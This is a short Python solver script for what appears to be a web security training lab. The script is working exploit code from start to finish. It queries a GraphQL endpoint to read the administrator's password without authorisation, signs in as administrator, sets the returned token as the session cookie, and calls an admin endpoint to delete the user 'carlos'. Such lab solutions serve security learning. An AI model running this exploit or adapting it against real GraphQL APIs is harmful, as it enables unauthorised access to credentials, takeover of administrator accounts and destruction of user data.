import requests
import json
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.password = None

    def getting_administrator_password(self):
        graphql_query = '''
            query {
                getUser(id: 1) {
                    password
                }
            }
        '''
        payload = {
            'query': graphql_query
        }
        response = self.session.post(self.lab_url + 'graphql/v1', json=payload)
        self.password = json.loads(response.text)['data']['getUser']['password']

    def signing_in(self):
        graphql_query = '''
        mutation login($input: LoginInput!) {
            login(input: $input) {
                success
                token
            }
        }
        '''
        variables = {
            'input': {
                'username': 'administrator',
                'password': self.password
            }
        }
        payload = {
            'query': graphql_query,
            'variables': variables
        }
        response = self.session.post(self.lab_url + 'graphql/v1', json=payload)
        self.session.cookies['session'] = json.loads(response.text)['data']['login']['token']

    def delete_the_user(self):
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_administrator_password()
        self.signing_in()
        self.delete_the_user()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
